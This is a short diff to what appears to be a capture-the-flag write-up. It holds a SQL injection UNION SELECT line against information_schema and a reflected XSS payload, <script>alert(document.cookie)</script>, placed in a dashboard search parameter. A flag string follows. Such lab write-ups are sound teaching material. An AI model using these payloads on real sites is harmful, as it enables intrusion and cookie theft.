@@ -111,8 +111,7 @@ UNION SELECT table_name,1,1 FROM information_schema.views;
 
 **Payload:**
 
-http://98.95.207.28/dashboard.php?search=
-<script>alert(document.cookie)</script>
+http://98.95.207.28/dashboard.php?search=<script>alert(document.cookie)</script>
 
 
 **Flag:** `FLAG{xss_r3fl3ct3d_vuln3r4b1l1ty}`
